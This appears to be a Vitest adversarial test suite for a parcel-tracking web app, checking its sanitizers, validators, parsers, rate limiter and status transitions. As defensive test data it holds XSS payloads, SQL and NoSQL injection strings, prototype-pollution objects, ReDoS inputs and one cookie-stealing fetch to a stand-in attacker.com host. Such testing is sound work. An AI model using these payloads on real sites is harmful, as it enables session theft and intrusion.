import { describe, it, expect } from 'vitest';
import { sanitizeString, validatePackage, validatePackageList } from './packageValidator';
import { parseSmartText } from './smartParser';


describe('Tier 5 Adversarial Stress & Anti-Fragility Testbench', () => {
  describe('Fuzzing & Payload Torture on sanitizeString', () => {
    it('survives nested recursive XSS attack vectors without throwing or leaving active scripts', () => {
      const recursivePayloads = [
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<<<script>>>alert(1)<</script>>',
        '<svg/onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<a href="javascript:alert(1)">Click Me</a>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        '"><script>alert(String.fromCharCode(88,83,83))</script>'
      ];

      for (const payload of recursivePayloads) {
        const cleaned = sanitizeString(payload);
        expect(cleaned).not.toContain('<script');
        expect(cleaned).not.toContain('onload=');
        expect(cleaned).not.toContain('javascript:');
      }
    });

    it('survives massive 2MB strings without causing ReDoS or catastrophic backtracking', () => {
      const largePayload = 'A'.repeat(500000) + '<script>evil()</script>' + 'B'.repeat(500000);

      const start = performance.now();
      const result = sanitizeString(largePayload, 200);
      const duration = performance.now() - start;

      // Behaviour first: the call returns, and truncates to the requested cap
      // rather than choking on the 1MB input.
      expect(result.length).toBeLessThanOrEqual(200);
      expect(result).not.toContain('<script');

      // Timing ceiling is deliberately ~50x the observed cost (a few ms) rather
      // than a tight 100ms bound. This assertion exists only to catch
      // catastrophic backtracking, which turns milliseconds into seconds or
      // minutes on an input this size; it must not turn red merely because a
      // parallel test worker was busy.
      expect(duration).toBeLessThan(5000);
    });
  });

  describe('Extreme Boundary Conditions & Prototype Tampering on validatePackage', () => {
    it('defends against __proto__, constructor, and Object.prototype poisoning', () => {
      const poison = {
        id: 'pkg-poison-1',
        title: 'Harmless Package',
        trackingNumber: 'RR123456789IL',
        __proto__: { isAdmin: true, polluted: 'CRITICAL_VULNERABILITY' },
        constructor: { prototype: { backdoor: true } }
      };

      const result = validatePackage(poison);
      expect(result).not.toBeNull();
      expect({}.polluted).toBeUndefined();
      expect({}.isAdmin).toBeUndefined();
      expect({}.backdoor).toBeUndefined();
      expect(Object.prototype.polluted).toBeUndefined();
    });

    it('rejects cyclical object references safely without infinite recursion / call-stack overflow', () => {
      const cyclic = {
        id: 'pkg-cyclic',
        title: 'Cyclic Ref Package',
        trackingNumber: 'LP123456789CN'
      };
      cyclic.self = cyclic;

      expect(() => validatePackage(cyclic)).not.toThrow();
      const validated = validatePackage(cyclic);
      expect(validated).not.toBeNull();
      expect(validated.self).toBeUndefined();
    });
  });

  describe('Smart Parser Adversarial Inputs', () => {
    it('handles garbage unicode, emojis, and binary junk gracefully', () => {
      const garbage = '📦🚀 🔥 דואר ישראל 💥 𝓤𝓷𝓲𝓬𝓸𝓭𝓮 𝗧𝗲𝘅𝘁 \u0000\u0007 RS948219481IL לחלוקה 4821';
      const parsed = parseSmartText(garbage);

      expect(parsed.trackingNumber).toBe('RS948219481IL');
      expect(parsed.carrier).toBe('israel-post');
    });

    it('correctly extracts tracking when surrounded by punctuation and URLs', () => {
      const text = 'Check out tracking at https://israelpost.co.il/item?code=RR987654321IL. Contact us!';
      const parsed = parseSmartText(text);

      expect(parsed.trackingNumber).toBe('RR987654321IL');
      expect(parsed.carrier).toBe('israel-post');
    });
  });

  describe('Storage Quota & Concurrency Race Stress', () => {
    it('never truncates an over-large package list (issue #40)', () => {
      const oversizedList = Array.from({ length: 1200 }, (_, i) => ({
        id: `pkg-${i}`,
        title: `Package ${i}`,
        trackingNumber: `RR${String(i).padStart(9, '0')}IL`,
        carrier: 'israel-post'
      }));

      const validated = validatePackageList(oversizedList);
      expect(validated.length).toBe(1200);
    });
  });

  describe('BIST Diagnostic Engine Stress & Adversarial Torture', () => {
    it('handles simulated storage quota exhaustion across multiple browser engines gracefully', async () => {
      const { runStorageSelfTest, runAllBistDiagnostics } = await import('./bistDiagnostics');

      const quotaErrors = [
        Object.assign(new Error('QuotaExceededError'), { name: 'QuotaExceededError', code: 22 }),
        Object.assign(new Error('NS_ERROR_DOM_QUOTA_REACHED'), { name: 'NS_ERROR_DOM_QUOTA_REACHED', code: 1014 }),
        Object.assign(new Error('Persistent storage full (DOMException)'), { name: 'DOMException' }),
        new Error('Disk full / write failure')
      ];

      for (const error of quotaErrors) {
        const mockFailingStorage = {
          setItem: () => { throw error; },
          getItem: () => null,
          removeItem: () => {}
        };

        const result = runStorageSelfTest(mockFailingStorage);
        expect(result.status).toBe('FAIL');
        expect(result.message).toContain('Quota/Private browsing lock');

        const aggregate = runAllBistDiagnostics({ storage: mockFailingStorage });
        expect(aggregate.status).toBe('FAIL');
        expect(aggregate.summary.failed).toBe(1);
      }
    });

    it('resists prototype pollution payloads injected into custom carrier samples and storage objects', async () => {
      const { runCarrierRegexSelfTest, runAllBistDiagnostics, runMemoryBoundsSelfTest } = await import('./bistDiagnostics');

      // Poisoned sample object
      const maliciousSamples = Object.assign(
        Object.create(null),
        {
          'israel-post': 'RS948219481IL',
          '__proto__': { isAdmin: true, bypass: true },
          'constructor': { prototype: { hijacked: true } }
        }
      );

      const regexResult = runCarrierRegexSelfTest(maliciousSamples);
      expect(regexResult.status).toBe('PASS');
      expect({}.isAdmin).toBeUndefined();
      expect({}.hijacked).toBeUndefined();

      // Memory bounds with prototype poisoned entries
      const poisonedMemoryLimit = 1500;
      const memResult = runMemoryBoundsSelfTest(poisonedMemoryLimit);
      expect(memResult.status).toBe('PASS');
      expect(memResult.details.limit).toBe(1000);

      // Aggregate report under prototype attack with mock storage
      const mockStorage = {
        _store: {},
        getItem(key) { return this._store[key] || null; },
        setItem(key, val) { this._store[key] = String(val); },
        removeItem(key) { delete this._store[key]; }
      };

      const aggregate = runAllBistDiagnostics({ storage: mockStorage, carrierSamples: maliciousSamples });
      expect(aggregate.status).toBe('PASS');
      expect({}.bypass).toBeUndefined();
    });
  });

  describe('Adversarial Tracking Service & Rate Limiter Security Pentest', () => {
    it('resists XSS, SQL/NoSQL injection, oversized strings, and non-string types in tracking numbers', async () => {
      const { fetchTrackingUpdates, resetTrackingCooldown } = await import('../services/trackingService');
      resetTrackingCooldown();

      const maliciousTrackingPayloads = [
        '<script>alert("xss")</script>',
        'javascript:fetch("//attacker.com/?cookie="+document.cookie)',
        '<img src=x onerror="alert(1)">',
        '\' OR \'1\'=\'1',
        '\' UNION SELECT * FROM users --',
        '{"$gt": ""}',
        '{"$ne": null}',
        'A'.repeat(25000),
        'RS123456\u0000789IL',
        'IL\u0000\u0008\u001F',
        null,
        undefined,
        123456789,
        true,
        false,
        {},
        [],
        () => 'malicious'
      ];

      for (const payload of maliciousTrackingPayloads) {
        resetTrackingCooldown();
        const res = await fetchTrackingUpdates(payload);
        if (payload && typeof payload === 'string') {
          expect(res).toBeDefined();
          expect(typeof res.success).toBe('boolean');
          expect(res.carrier).toBeDefined();
          if (res.checkpoints) {
            for (const cp of res.checkpoints) {
              expect(cp.id).not.toContain('<script>');
              expect(cp.id.length).toBeLessThanOrEqual(100);
            }
          }
        } else {
          // Non-string or falsy payloads must be safely rejected
          expect(res.success).toBe(false);
          expect(res.error).toBe('Invalid tracking number');
        }
      }
    });

    it('strictly enforces cooldown rate-limiting against rapid concurrent requests and bypass attempts', async () => {
      const { fetchTrackingUpdates, checkRateLimit, resetTrackingCooldown } = await import('../services/trackingService');
      const testTracking = 'RR987654321IL';
      resetTrackingCooldown(testTracking);

      // 1. Initial request succeeds
      const firstRes = await fetchTrackingUpdates(testTracking, 'israel-post');
      expect(firstRes.success).toBe(true);

      // 2. Immediate second request is strictly rate-limited
      const secondRes = await fetchTrackingUpdates(testTracking, 'israel-post');
      expect(secondRes.success).toBe(false);
      expect(secondRes.rateLimited).toBe(true);
      expect(secondRes.remainingCooldownMs).toBeGreaterThan(0);
      expect(secondRes.error).toContain('Please wait');

      // 3. Direct checkRateLimit verification
      const check = checkRateLimit(testTracking);
      expect(check.isLimited).toBe(true);
      expect(check.remainingMs).toBeGreaterThan(0);

      // 4. Concurrent swarm (10 simultaneous calls for the same tracking number)
      const concurrentResults = await Promise.all(
        Array.from({ length: 10 }, () => fetchTrackingUpdates(testTracking, 'israel-post'))
      );
      // All 10 must be blocked by the active cooldown
      for (const res of concurrentResults) {
        expect(res.success).toBe(false);
        expect(res.rateLimited).toBe(true);
      }

      // 5. Reset tracking allows immediate new fetch
      resetTrackingCooldown(testTracking);
      const afterReset = await fetchTrackingUpdates(testTracking, 'israel-post');
      expect(afterReset.success).toBe(true);
    });

    it('bounds cooldown cache memory capacity to prevent memory exhaustion / DoS attacks', async () => {
      const { recordTrackingFetch, checkRateLimit, resetTrackingCooldown } = await import('../services/trackingService');
      resetTrackingCooldown();

      // Bombard cache with 2,500 distinct tracking numbers
      for (let i = 0; i < 2500; i++) {
        recordTrackingFetch(`SPAM_TRACK_${i}_${'X'.repeat(50)}`);
      }

      // Latest recorded entries should be rate limited
      const recentCheck = checkRateLimit('SPAM_TRACK_2499_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX');
      expect(recentCheck.isLimited).toBe(true);

      // Reset works completely
      resetTrackingCooldown();
      const checkAfterClear = checkRateLimit('SPAM_TRACK_2499_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX');
      expect(checkAfterClear.isLimited).toBe(false);
    });
  });

  describe('ReDoS & Regular Expression Catastrophic Backtracking Resilience', () => {
    it('evaluates all carrier detection patterns against adversarial backtracking strings in < 50ms', async () => {
      const { detectCarrier } = await import('./carrierDetector');
      const { CARRIERS } = await import('../types/carriers');

      const adversarialPatterns = [
        '9'.repeat(100000),
        'A'.repeat(50000) + '!',
        '1Z' + 'A'.repeat(50000) + '!',
        'YT' + '9'.repeat(50000) + 'X',
        'LP' + '0'.repeat(50000) + 'CN!',
        'HFD' + '9'.repeat(50000) + '!',
        'BOX' + 'Z'.repeat(50000) + '!',
        'CH' + '8'.repeat(50000) + 'X',
        'RR' + '1'.repeat(50000) + 'IL!',
        '4PX' + '3'.repeat(50000) + '!',
        ' ' .repeat(50000) + 'RS948219481IL' + ' '.repeat(50000)
      ];

      // Whole-loop budget instead of a per-iteration one: a single tight bound
      // per input is what flakes under a loaded runner, while catastrophic
      // backtracking on 50k-character inputs blows past any of these ceilings
      // by orders of magnitude. ~10s for all patterns combined is roughly 100x
      // the observed cost and still fails a real ReDoS regression outright.
      const detectStart = performance.now();
      for (const attackStr of adversarialPatterns) {
        const res = detectCarrier(attackStr);
        expect(res).toBeDefined();
        expect(typeof res.carrierId).toBe('string');
      }
      expect(performance.now() - detectStart).toBeLessThan(10000);

      // Also audit raw patterns in CARRIERS
      const probe = 'A'.repeat(10000) + '9'.repeat(10000) + 'IL';
      const regexStart = performance.now();
      for (const carrier of Object.values(CARRIERS)) {
        for (const regex of carrier.patterns) {
          expect(typeof regex.test(probe)).toBe('boolean');
        }
      }
      expect(performance.now() - regexStart).toBeLessThan(10000);
    });

    it('smart parser withstands nested punctuation and massive tokenized fuzzing strings', async () => {
      const { parseSmartText, extractTrackingCandidates } = await import('./smartParser');

      const pathologicalTexts = [
        'Tracking: ' + '(((:::'.repeat(1000) + ' RS948219481IL ' + ')))!!!'.repeat(1000),
        'מעקב משלוח: ' + '---===###'.repeat(1000) + ' 1Z999AA10123456784 ' + '***'.repeat(1000),
        'word '.repeat(5000) + 'RS948219481IL',
        '<!DOCTYPE html><html><body>' + '<a href="'.repeat(500) + 'RS948219481IL' + '"></a>'.repeat(500) + '</body></html>'
      ];

      // Same rationale as above: one generous whole-loop ceiling rather than a
      // tight per-input bound that a busy runner can trip on its own.
      const parseStart = performance.now();
      for (const text of pathologicalTexts) {
        const parsed = parseSmartText(text);
        const candidates = extractTrackingCandidates(text);

        expect(parsed).toBeDefined();
        expect(Array.isArray(candidates)).toBe(true);
      }
      expect(performance.now() - parseStart).toBeLessThan(10000);
    });
  });

  describe('Carrier Response Fuzzing & Checkpoint Schema Integrity', () => {
    it('normalizes malformed, corrupted, and prototype-poisoned checkpoint arrays without crashing', async () => {
      const { normalizeCheckpoints } = await import('../services/trackingService');
      const { checkpointSchema } = await import('../schemas/packageSchema');

      const corruptedCheckpoints = [
        null,
        undefined,
        12345,
        'string-checkpoint',
        { id: null, title: undefined, timestamp: null },
        { id: '<script>alert(1)</script>', title: '<img src=x onerror=evil()>', details: 'A'.repeat(5000) },
        { __proto__: { admin: true }, constructor: { prototype: { hacked: true } } },
        { id: 'cp-valid-1', title: 'Valid Step', timestamp: '2026-08-19T12:00:00.000Z', isCompleted: true },
        Object.assign(Object.create(null), { id: 'cp-null-proto', title: 'Safe Checkpoint' })
      ];

      const normalized = normalizeCheckpoints(corruptedCheckpoints, '<script>trk</script>');
      expect(Array.isArray(normalized)).toBe(true);
      expect(normalized.length).toBe(corruptedCheckpoints.length);

      // Verify each checkpoint matches Zod checkpointSchema or cleans safely
      for (const cp of normalized) {
        expect(typeof cp.id).toBe('string');
        expect(typeof cp.title).toBe('string');
        expect(typeof cp.timestamp).toBe('string');
        expect(typeof cp.isCompleted).toBe('boolean');

        const zodCheck = checkpointSchema.safeParse(cp);
        expect(zodCheck.success).toBe(true);
      }
      expect({}.admin).toBeUndefined();
      expect({}.hacked).toBeUndefined();
    });

    it('batchRefreshTracking safely tolerates arrays with corrupted, missing, or rate-limited packages', async () => {
      const { batchRefreshTracking, resetTrackingCooldown } = await import('../services/trackingService');
      resetTrackingCooldown();

      const mixedPackages = [
        { id: 'pkg-1', title: 'Valid Pkg', trackingNumber: 'RS948219481IL', carrier: 'israel-post', status: 'in_transit' },
        { id: 'pkg-2', title: 'Delivered Pkg', trackingNumber: 'CH10849201', carrier: 'chita', status: 'delivered' }, // Should be skipped (delivered)
        { id: 'pkg-3', title: 'Archived Pkg', trackingNumber: 'BOX920194', carrier: 'boxit', status: 'in_transit', isArchived: true }, // Should be skipped (archived)
        { id: 'pkg-4', title: 'Missing Tracking', trackingNumber: '', carrier: 'other', status: 'in_transit' },
        { id: 'pkg-5', title: 'Invalid Fields', trackingNumber: 'HFD90481029', carrier: 'hfd', status: 'in_transit', checkpoints: 'NOT_AN_ARRAY' },
        { id: 'pkg-6', title: 'Corrupted', trackingNumber: 'YT2109849201948201', carrier: 'yunexpress', status: 'in_transit' }
      ];

      let progressReports = 0;
      const res = await batchRefreshTracking(mixedPackages, () => {
        progressReports++;
      }, 2);

      expect(res).toBeDefined();
      expect(Array.isArray(res.updatedPackages)).toBe(true);
      expect(res.updatedPackages.length).toBe(mixedPackages.length);
      // No carrier here resolves to live data, so nothing may be refreshed and
      // no package may acquire checkpoints it did not already have.
      expect(res.refreshedCount).toBe(0);
      expect(res.untrackedCount).toBeGreaterThanOrEqual(1);
      expect(res.updatedPackages.every(p => !Array.isArray(p.checkpoints) || p.checkpoints.length === 0)).toBe(true);
      expect(progressReports).toBeGreaterThan(0);
    });
  });

  describe('State Machine & Status Transition Integrity', () => {
    it('strictly forbids invalid status transitions and tampering attempts', async () => {
      const { deliveryService, canTransition } = await import('../services/deliveryService');

      // Valid transitions
      expect(canTransition('ordered', 'shipped')).toBe(true);
      expect(canTransition('shipped', 'in_transit')).toBe(true);
      expect(canTransition('in_transit', 'delivered')).toBe(true);
      expect(canTransition('delivered', 'archived')).toBe(true);
      expect(canTransition('ordered', 'ordered')).toBe(true);

      // Illegal transitions
      expect(canTransition('delivered', 'ordered')).toBe(false);
      expect(canTransition('delivered', 'in_transit')).toBe(false);
      expect(canTransition('delivered', 'shipped')).toBe(false);
      expect(canTransition('delivered', 'customs')).toBe(false);
      expect(canTransition('delivered', 'out_for_delivery')).toBe(false);
      expect(canTransition('archived', null)).toBe(false);
      expect(canTransition('__proto__', 'delivered')).toBe(false);
      expect(canTransition('in_transit', '__proto__')).toBe(false);

      // updatePackageStatus rejecting illegal transition
      const packages = [
        { id: 'pkg-del-1', title: 'Delivered Pkg', trackingNumber: 'RS123IL', carrier: 'israel-post', status: 'delivered' }
      ];

      const illegalUpdate = deliveryService.updatePackageStatus(packages, 'pkg-del-1', 'ordered');
      expect(illegalUpdate.success).toBe(false);
      expect(illegalUpdate.error).toContain('Cannot transition from delivered to ordered');
    });
  });
});



